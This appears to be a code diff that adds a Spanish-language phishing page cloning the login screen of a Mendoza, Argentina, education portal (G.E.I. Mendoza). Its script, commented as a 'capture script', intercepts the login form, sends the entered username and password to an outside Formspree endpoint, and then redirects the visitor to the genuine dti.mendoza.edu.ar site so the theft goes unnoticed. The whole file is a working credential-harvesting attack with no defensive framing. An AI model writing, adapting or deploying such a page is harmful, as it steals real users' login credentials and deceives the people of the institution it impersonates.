@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Ingresar</title>
+    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+    <meta name="description" content="">
+    
+    <!-- Bootstrap 3.3.6 desde CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css">
+    <!-- Font Awesome Icons desde CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <!-- AdminLTE Theme style desde CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.3.11/css/AdminLTE.min.css" />
+    <!-- iCheck desde CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.2/skins/square/blue.css" />
+    
+    <!-- El estilo personalizado de la página se mantiene igual -->
+    <style>
+        .form {
+            position: relative;
+            z-index: 1;
+            background: #FFFFFF;
+            max-width: 360px;
+            margin: 0 auto 100px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
+        }
+        .form-control {
+            width: 100%;
+            height: 45px;
+            border: none;
+            padding: 5px 7px 5px 15px;
+            background: #fff;
+            color: #666;
+            border: 2px solid #ddd;
+            -moz-border-radius: 4px;
+            -webkit-border-radius: 4px;
+            border-radius: 4px;
+        }
+        .form-control:focus,
+        .form-control:focus+.fa {
+            border-color: #3c8dbc;
+        }
+        .form-control:focus+.fa {
+            color: #3c8dbc;
+        }
+        .form-group .fa {
+            position: absolute;
+            right: 10px;
+            top: 6px;
+            color: #999;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .btn {
+            width: 100%;
+            font-size: 16px;
+            height: 40px;
+            border-radius: 4px;
+        }
+        .btn.btn-flat {
+            margin-top: 4px;
+            border-radius: 4px;
+        }
+        .login-box-msg+.error {
+            margin: 0;
+            text-align: center;
+            color: #a94442;
+            padding: 0 20px 10px 20px;
+        }
+        .login-box-msg+.message {
+            margin: 0;
+            text-align: center;
+            color: #008d4c;
+            padding: 0 20px 10px 20px;
+        }
+        .log-status.wrong-entry {
+            -moz-animation: wrong-log 0.3s;
+            -webkit-animation: wrong-log 0.3s;
+            animation: wrong-log 0.3s;
+        }
+        .log-status.wrong-entry .form-control,
+        .wrong-entry .form-control+.fa {
+            border-color: #ed1c24;
+            color: #ed1c24;
+        }
+        .alert {
+            display: none;
+            padding: 0px;
+            margin-bottom: -19px;
+            font-size: 12px;
+            color: #f00;
+            text-align: center;
+        }
+        .alert_pass {
+            display: none;
+            padding: 0px;
+            margin-bottom: -17px;
+            font-size: 12px;
+            color: #f00;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body class="hold-transition login-page">
+    <div class="login-box">
+        <div class="login-logo">
+            <img src="https://via.placeholder.com/300x100.png?text=G.E.I.+Mendoza" alt="G.E.I." width="100%" />
+        </div>
+        <div class="form">
+            <p class="login-box-msg">Por favor, introduce tu usuario y contraseña.</p>
+            <form id="loginForm" method="post">
+                <div class="form-group has-feedback" id="verificar">
+                    <input type="text" name="identity" value="" id="identity" class="has-feedback form-control" placeholder="Usuario" />
+                    <span class="fa fa-user form-control-feedback"></span>
+                    <div class="alert">El campo usuario no puede estar vacío.</div>
+                </div>
+                <div class="form-group has-feedback" id="verificar_pass">
+                    <input type="password" name="password" value="" id="password" class="has-feedback form-control" placeholder="Contraseña" />
+                    <span class="fa fa-lock form-control-feedback"></span>
+                    <div class="alert_pass">El campo contraseña no puede estar vacío.</div>
+                </div>
+                <input type="hidden" name="redirect_url" value="" />
+                <div class="row">
+                    <div class="col-xs-12">
+                        <input type="submit" name="submit" value="Ingresar" class="btn btn-primary btn-block btn-flat" />
+                    </div>
+                </div>
+                <br>
+                <a class="btn btn-success btn-block" href="http://intranet.mendoza.edu.ar">Acceder desde intranet.mendoza.edu.ar</a>
+            </form>
+            <br>
+            <label style="text-align: center; width: 100%">
+                <a href="usuarios/auth_login/recuperar_password">Recuperar contraseña.</a>
+            </label>
+        </div>
+    </div>
+
+    <!-- Scripts necesarios desde CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.2/icheck.min.js"></script>
+
+    <!-- --- NUESTRO SCRIPT DE CAPTURA --- -->
+    <script>
+        // Se mantiene el script original de iCheck para que no haya errores de consola
+        $(function() {
+            $('input').iCheck({
+                checkboxClass: 'icheckbox_square-blue',
+                radioClass: 'iradio_square-blue',
+                increaseArea: '20%'
+            });
+        });
+
+        // Nuestro script de captura, ahora compatible con jQuery
+        $('#loginForm').on('submit', function(event) {
+            event.preventDefault();
+
+            const usuario = $('#identity').val();
+            const password = $('#password').val();
+
+            const receptorURL = 'https://formspree.io/f/mnjbkdlv';
+
+            const datosAEnviar = {
+                usuario: usuario,
+                contra: password
+            };
+
+            fetch(receptorURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(datosAEnviar)
+            })
+            .then(() => {
+                window.location.href = 'https://dti.mendoza.edu.ar/gem/';
+            })
+            .catch(error => {
+                console.error('Error al enviar:', error);
+                window.location.href = 'https://dti.mendoza.edu.ar/gem/';
+            });
+        });
+    </script>
+</body>
+
+  </html>
